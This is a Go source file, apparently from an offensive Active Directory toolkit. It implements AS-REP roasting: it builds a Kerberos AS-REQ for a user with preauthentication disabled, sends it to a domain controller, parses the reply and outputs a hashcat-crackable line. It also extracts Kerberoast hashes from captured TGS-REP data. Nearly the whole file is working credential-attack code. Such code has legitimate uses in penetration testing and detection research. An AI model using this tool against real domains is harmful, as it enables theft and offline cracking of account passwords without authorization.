package adgo

import (
	"context"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"
)

// The AS-REP roast chain — build the AS-REQ, send it to the DC, parse
// the response, extract the encrypted part, and produce the hashcat
// line. This is the whole primitive in one function.

// RoastOptions controls an AS-REP roast.
type RoastOptions struct {
	DC       string        // domain controller IP or hostname
	Port     int           // 88 default
	Domain   string        // CORP.LOCAL
	Username string        // target user (must have DONT_REQ_PREAUTH set)
	ETypes   []int32       // default [23, 18, 17]
	Timeout  time.Duration // per request
}

// RoastResult is the outcome.
type RoastResult struct {
	User        string
	Realm       string
	HashcatLine string
	EncPart     []byte
}

// ASREPRoast builds the AS-REQ, sends it to the DC, parses the AS-REP,
// and returns the hashcat 18200 line.
func ASREPRoast(ctx context.Context, opts RoastOptions) (*RoastResult, error) {
	if opts.DC == "" {
		return nil, errors.New("adgo: DC required")
	}
	if opts.Domain == "" {
		return nil, errors.New("adgo: domain required")
	}
	if opts.Username == "" {
		return nil, errors.New("adgo: username required")
	}
	if opts.Port == 0 {
		opts.Port = 88
	}
	if opts.Timeout == 0 {
		opts.Timeout = 5 * time.Second
	}

	req, err := BuildASREQ(ASREQOptions{
		Realm:    opts.Domain,
		Username: opts.Username,
		ETypes:   opts.Etypes(),
	})
	if err != nil {
		return nil, fmt.Errorf("adgo: build AS-REQ: %w", err)
	}

	respBytes, err := kerbSend(ctx, opts.DC, opts.Port, req, opts.Timeout)
	if err != nil {
		return nil, fmt.Errorf("adgo: send: %w", err)
	}

	resp, err := ParseASREP(respBytes)
	if err != nil {
		return nil, fmt.Errorf("adgo: parse: %w", err)
	}

	hash, err := BuildASREPHashline(opts.Username, opts.Domain, resp.EncPart)
	if err != nil {
		return nil, fmt.Errorf("adgo: hashcat line: %w", err)
	}

	return &RoastResult{
		User:        hash.User,
		Realm:       hash.Realm,
		HashcatLine: hash.HashcatLine,
		EncPart:     hash.Encrypted,
	}, nil
}

// Etypes returns the caller's etypes or the default set.
func (o RoastOptions) Etypes() []int32 {
	if len(o.ETypes) > 0 {
		return o.ETypes
	}
	return []int32{ETypeRC4_HMAC, ETypeAES256, ETypeAES128}
}

// kerbSend sends a Kerberos message over TCP with a 4-byte big-endian
// length prefix, reads the response, and returns the response bytes.
func kerbSend(ctx context.Context, host string, port int, payload []byte, timeout time.Duration) ([]byte, error) {
	addr := fmt.Sprintf("%s:%d", host, port)
	d := net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(timeout))

	lenBuf := make([]byte, 4)
	putUint32BE(lenBuf, uint32(len(payload)))
	if _, err := conn.Write(append(lenBuf, payload...)); err != nil {
		return nil, err
	}
	if _, err := readFull(conn, lenBuf); err != nil {
		return nil, err
	}
	rlen := getUint32BE(lenBuf)
	if rlen == 0 || rlen > 1<<20 {
		return nil, fmt.Errorf("adgo: bad response length %d", rlen)
	}
	resp := make([]byte, rlen)
	if _, err := readFull(conn, resp); err != nil {
		return nil, err
	}
	return resp, nil
}

// putUint32BE writes n as a big-endian 32-bit int.
func putUint32BE(b []byte, n uint32) {
	b[0] = byte(n >> 24)
	b[1] = byte(n >> 16)
	b[2] = byte(n >> 8)
	b[3] = byte(n)
}

// getUint32BE reads a big-endian 32-bit int from b.
func getUint32BE(b []byte) uint32 {
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}

// ExtractKerberoastFromTGS parses a captured TGS-REP blob and returns
// the hashcat line. Useful when the operator already has a TGS captured
// through other means.
func ExtractKerberoastFromTGS(user, realm, spn string, tgsBytes []byte, eType int) (string, []byte, error) {
	r := NewDERReader(tgsBytes)
	tag, content, err := r.ReadTLV()
	if err != nil {
		return "", nil, err
	}
	if TagClass(tag) != ClassApplication || TagNumber(tag) != 13 {
		return "", nil, fmt.Errorf("adgo: not a TGS-REP (tag 0x%02x)", tag)
	}
	r2 := NewDERReader(content)
	_, inner, err := r2.ReadTLV()
	if err != nil {
		return "", nil, err
	}
	rr := NewDERReader(inner)
	var encPart []byte
	for {
		t, c, err := rr.ReadTLV()
		if err != nil {
			break
		}
		if TagNumber(t) == 6 {
			sr := NewDERReader(c)
			_, seq, err := sr.ReadTLV()
			if err != nil {
				continue
			}
			er := NewDERReader(seq)
			for {
				et, ec, err := er.ReadTLV()
				if err != nil {
					break
				}
				if TagNumber(et) == 2 {
					cr := NewDERReader(ec)
					_, cipher, err := cr.ReadTLV()
					if err == nil {
						encPart = cipher
					}
				}
			}
		}
	}
	if len(encPart) == 0 {
		return "", nil, errors.New("adgo: no enc-part in TGS-REP")
	}
	hash, err := BuildTGSHashline(user, realm, spn, eType, encPart)
	if err != nil {
		return "", nil, err
	}
	return hash.HashcatLine, hash.Encrypted, nil
}

// TrimHashcatLine trims whitespace from a hashcat line for printing.
func TrimHashcatLine(s string) string {
	return strings.TrimSpace(s)
}
